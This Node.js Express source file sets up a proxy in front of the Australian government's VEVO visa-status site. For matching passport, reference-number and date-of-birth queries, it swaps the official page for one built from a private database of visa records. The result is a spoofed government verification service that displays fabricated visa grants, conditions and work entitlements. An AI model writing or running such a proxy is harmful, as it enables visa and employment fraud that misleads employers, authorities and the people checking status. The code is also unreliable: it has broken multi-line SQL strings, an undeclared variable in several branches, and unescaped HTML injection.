const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { query, run } = require('../database/db');

const app = express();
const port = 8080;

// Middleware to parse URL-encoded and JSON bodies
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from public directory
app.use(express.static('public'));

// Proxy middleware for VEVO requests
const proxy = createProxyMiddleware({
    target: 'https://online.immi.gov.au',
    changeOrigin: true,
    onProxyReq: (proxyReq, req, res) => {
        // Remove Accept-Encoding header to prevent compression
        proxyReq.setHeader('Accept-Encoding', '');
        
        // Log the request for debugging
        console.log(`Proxying request to VEVO: ${req.method} ${req.url}`);
    },
    onProxyRes: async (proxyRes, req, res) => {
        // Only intercept specific VEVO query requests
        if (req.url === '/evo/firstParty' && req.method === 'GET' && req.query.actionType === 'query') {
            const { passportNumber, referenceNumber, dob } = req.query;
            
            try {
                // Query the database for matching visa application
                const applications = await query(
                    'SELECT * FROM visa_applications 
                     WHERE passport_number = ? AND reference_number = ? AND date_of_birth = ?',
                    [passportNumber, referenceNumber, dob]
                );
                
                if (applications.length > 0) {
                    // Found matching record - inject our custom HTML
                    const application = applications[0];
                    
                    // Read the proxy response
                    let responseBody = '';
                    proxyRes.setEncoding('utf8');
                    proxyRes.on('data', (chunk) => {
                        responseBody += chunk;
                    });
                    proxyRes.on('end', () => {
                        try {
                            // Parse the HTML with Cheerio
                            const $ = cheerio.load(responseBody);
                            
                            // Inject custom styles for VEVO layout
                            $('head').append(`
                                <style>
                                    .vevo-table { border: 1px solid #ccc; margin: 20px 0; }
                                    .vevo-table th, .vevo-table td { padding: 10px; border: 1px solid #ddd; }
                                    .vevo-table th { background-color: #f2f2f2; }
                                    .status-badge {
                                        display: inline-block;
                                        padding: 5px 10px;
                                        border-radius: 15px;
                                        font-size: 12px;
                                        color: white;
                                    }
                                    .status-approved {
                                        background-color: #28a745;
                                    }
                                    .status-in-progress {
                                        background-color: #ffc107;
                                        color: #000;
                                    }
                                    .status-rejected {
                                        background-color: #dc3545;
                                    }
                                    .status-in-effect {
                                        background-color: #17a2b8;
                                    }
                                    .status-not-in-effect {
                                        background-color: #6c757d;
                                    }
                                    .status-cancelled {
                                        background-color: #6f42c1;
                                    }
                                </style>
                            `);
                            
                            // Replace the VEVO content with our custom display
                            let visaStatusClass = 'status-' + application.visa_status.toLowerCase().replace(' ', '-').replace('not-', 'not-');
                            
                            $('body').html(`
                                <div style="max-width: 800px; margin: 20px auto; padding: 20px;">
                                    <h1 style="color: #0056b3; margin-bottom: 20px;">VEVO Visa Status</h1>
                                    
                                    <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
                                        <h3 style="margin-bottom: 10px;">Visa Holder Information</h3>
                                        <p><strong>Given Names:</strong> ${application.given_names}</p>
                                        <p><strong>Family Name:</strong> ${application.family_name}</p>
                                        <p><strong>Passport Number:</strong> ${application.passport_number}</p>
                                        <p><strong>Country of Passport:</strong> ${application.country_of_passport}</p>
                                        <p><strong>Date of Birth:</strong> ${application.date_of_birth}</p>
                                    </div>
                                    
                                    <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
                                        <h3 style="margin-bottom: 10px;">Visa Details</h3>
                                        <p><strong>Visa Class & Subclass:</strong> ${application.visa_class_subclass}</p>
                                        <p><strong>Visa Description:</strong> ${application.visa_description}</p>
                                        <p><strong>Visa Status:</strong> <span class="status-badge ${visaStatusClass}">${application.visa_status}</span></p>
                                        <p><strong>Visa Applicant Status:</strong> ${application.visa_applicant_status}</p>
                                        ${application.grant_date ? `<p><strong>Grant Date:</strong> ${application.grant_date}</p>` : ''}
                                        ${application.expiry_date ? `<p><strong>Expiry Date:</strong> ${application.expiry_date}</p>` : ''}
                                        ${application.mandatory_arrival_date ? `<p><strong>Must Not Arrive After:</strong> ${application.mandatory_arrival_date}</p>` : ''}
                                        ${application.period_of_stay ? `<p><strong>Period of Stay:</strong> ${application.period_of_stay}</p>` : ''}
                                        ${application.entries_allowed ? `<p><strong>Entries Allowed:</strong> ${application.entries_allowed}</p>` : ''}
                                        ${application.location_at_grant ? `<p><strong>Location at Grant:</strong> ${application.location_at_grant}</p>` : ''}
                                    </div>
                                    
                                    <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px;">
                                        <h3 style="margin-bottom: 10px;">Entitlements & Conditions</h3>
                                        ${application.work_entitlements ? `
                                            <h4>Work Entitlements:</h4>
                                            <ul>
                                                ${JSON.parse(application.work_entitlements).map(condition => `<li>${condition}</li>`).join('')}
                                            </ul>
                                        ` : ''}
                                        ${application.study_entitlements ? `
                                            <h4>Study Entitlements:</h4>
                                            <ul>
                                                ${JSON.parse(application.study_entitlements).map(condition => `<li>${condition}</li>`).join('')}
                                            </ul>
                                        ` : ''}
                                        ${application.other_conditions ? `
                                            <h4>Other Conditions:</h4>
                                            <ul>
                                                ${JSON.parse(application.other_conditions).map(condition => `<li>${condition}</li>`).join('')}
                                            </ul>
                                        ` : ''}
                                    </div>
                                    
                                    <div style="margin-top: 20px; text-align: center;">
                                        <button style="background-color: #0056b3; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;" onclick="window.print()">Print Page</button>
                                    </div>
                                </div>
                            `);
                            
                            // Send the modified HTML to the client
                            res.set('Content-Type', 'text/html; charset=utf-8');
                            res.send($.html());
                        } catch (err) {
                            console.error('Error processing HTML:', err);
                            res.send(responseBody); // Send original response on error
                        }
                    });
                } else {
                    // No matching record found - send original response
                    proxyRes.setEncoding('utf8');
                    proxyRes.on('data', (chunk) => {
                        responseBody += chunk;
                    });
                    proxyRes.on('end', () => {
                        res.set('Content-Type', 'text/html; charset=utf-8');
                        res.send(responseBody);
                    });
                }
            } catch (err) {
                console.error('Database query error:', err);
                proxyRes.setEncoding('utf8');
                proxyRes.on('data', (chunk) => {
                    responseBody += chunk;
                });
                proxyRes.on('end', () => {
                    res.set('Content-Type', 'text/html; charset=utf-8');
                    res.send(responseBody);
                });
            }
        } else {
            // For other requests, just forward the response
            let responseBody = '';
            proxyRes.setEncoding('utf8');
            proxyRes.on('data', (chunk) => {
                responseBody += chunk;
            });
            proxyRes.on('end', () => {
                res.set('Content-Type', 'text/html; charset=utf-8');
                res.send(responseBody);
            });
        }
    }
});

// Route to handle VEVO queries directly
app.get('/evo/firstParty', async (req, res) => {
    const { passportNumber, referenceNumber, dob } = req.query;
    
    try {
        // Query the database for matching visa application
        const applications = await query(
            'SELECT * FROM visa_applications 
             WHERE passport_number = ? AND reference_number = ? AND date_of_birth = ?',
            [passportNumber, referenceNumber, dob]
        );
        
        if (applications.length > 0) {
            const application = applications[0];
            
            // Create a custom VEVO page with the application details
            let visaStatusClass = 'status-' + application.visa_status.toLowerCase().replace(' ', '-').replace('not-', 'not-');
            
            const html = `
                <html>
                <head>
                    <title>VEVO Visa Status</title>
                    <style>
                        .vevo-table { border: 1px solid #ccc; margin: 20px 0; }
                        .vevo-table th, .vevo-table td { padding: 10px; border: 1px solid #ddd; }
                        .vevo-table th { background-color: #f2f2f2; }
                        .status-badge {
                            display: inline-block;
                            padding: 5px 10px;
                            border-radius: 15px;
                            font-size: 12px;
                            color: white;
                        }
                        .status-approved {
                            background-color: #28a745;
                        }
                        .status-in-progress {
                            background-color: #ffc107;
                            color: #000;
                        }
                        .status-rejected {
                            background-color: #dc3545;
                        }
                        .status-in-effect {
                            background-color: #17a2b8;
                        }
                        .status-not-in-effect {
                            background-color: #6c757d;
                        }
                        .status-cancelled {
                            background-color: #6f42c1;
                        }
                    </style>
                </head>
                <body>
                    <div style="max-width: 800px; margin: 20px auto; padding: 20px;">
                        <h1 style="color: #0056b3; margin-bottom: 20px;">VEVO Visa Status</h1>
                        
                        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
                            <h3 style="margin-bottom: 10px;">Visa Holder Information</h3>
                            <p><strong>Given Names:</strong> ${application.given_names}</p>
                            <p><strong>Family Name:</strong> ${application.family_name}</p>
                            <p><strong>Passport Number:</strong> ${application.passport_number}</p>
                            <p><strong>Country of Passport:</strong> ${application.country_of_passport}</p>
                            <p><strong>Date of Birth:</strong> ${application.date_of_birth}</p>
                        </div>
                        
                        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
                            <h3 style="margin-bottom: 10px;">Visa Details</h3>
                            <p><strong>Visa Class & Subclass:</strong> ${application.visa_class_subclass}</p>
                            <p><strong>Visa Description:</strong> ${application.visa_description}</p>
                            <p><strong>Visa Status:</strong> <span class="status-badge ${visaStatusClass}">${application.visa_status}</span></p>
                            <p><strong>Visa Applicant Status:</strong> ${application.visa_applicant_status}</p>
                            ${application.grant_date ? `<p><strong>Grant Date:</strong> ${application.grant_date}</p>` : ''}
                            ${application.expiry_date ? `<p><strong>Expiry Date:</strong> ${application.expiry_date}</p>` : ''}
                            ${application.mandatory_arrival_date ? `<p><strong>Must Not Arrive After:</strong> ${application.mandatory_arrival_date}</p>` : ''}
                            ${application.period_of_stay ? `<p><strong>Period of Stay:</strong> ${application.period_of_stay}</p>` : ''}
                            ${application.entries_allowed ? `<p><strong>Entries Allowed:</strong> ${application.entries_allowed}</p>` : ''}
                            ${application.location_at_grant ? `<p><strong>Location at Grant:</strong> ${application.location_at_grant}</p>` : ''}
                        </div>
                        
                        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px;">
                            <h3 style="margin-bottom: 10px;">Entitlements & Conditions</h3>
                            ${application.work_entitlements ? `
                                <h4>Work Entitlements:</h4>
                                <ul>
                                    ${JSON.parse(application.work_entitlements).map(condition => `<li>${condition}</li>`).join('')}
                                </ul>
                            ` : ''}
                            ${application.study_entitlements ? `
                                <h4>Study Entitlements:</h4>
                                <ul>
                                    ${JSON.parse(application.study_entitlements).map(condition => `<li>${condition}</li>`).join('')}
                                </ul>
                            ` : ''}
                            ${application.other_conditions ? `
                                <h4>Other Conditions:</h4>
                                <ul>
                                    ${JSON.parse(application.other_conditions).map(condition => `<li>${condition}</li>`).join('')}
                                </ul>
                            ` : ''}
                        </div>
                        
                        <div style="margin-top: 20px; text-align: center;">
                            <button style="background-color: #0056b3; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;" onclick="window.print()">Print Page</button>
                        </div>
                    </div>
                </body>
                </html>
            `;
            
            res.set('Content-Type', 'text/html; charset=utf-8');
            res.send(html);
        } else {
            // No matching record found - send a generic error message
            res.set('Content-Type', 'text/html; charset=utf-8');
            res.send(`
                <html>
                <head>
                    <title>VEVO Visa Status</title>
                </head>
                <body>
                    <div style="max-width: 800px; margin: 20px auto; padding: 20px;">
                        <h1 style="color: #0056b3; margin-bottom: 20px;">VEVO Visa Status</h1>
                        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px;">
                            <p>No matching visa application found for the provided details.</p>
                            <p>Please verify the passport number, reference number, and date of birth.</p>
                        </div>
                        <div style="margin-top: 20px; text-align: center;">
                            <button style="background-color: #0056b3; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;" onclick="window.history.back()">Back to Search</button>
                        </div>
                    </div>
                </body>
                </html>
            `);
        }
    } catch (err) {
        console.error('Database query error:', err);
        res.status(500).send('Internal server error');
    }
});

// Proxy all other requests to the VEVO site
app.use('*', proxy);

// Start server
app.listen(port, () => {
    console.log(`VEVO Proxy Engine running on http://localhost:${port}`);
});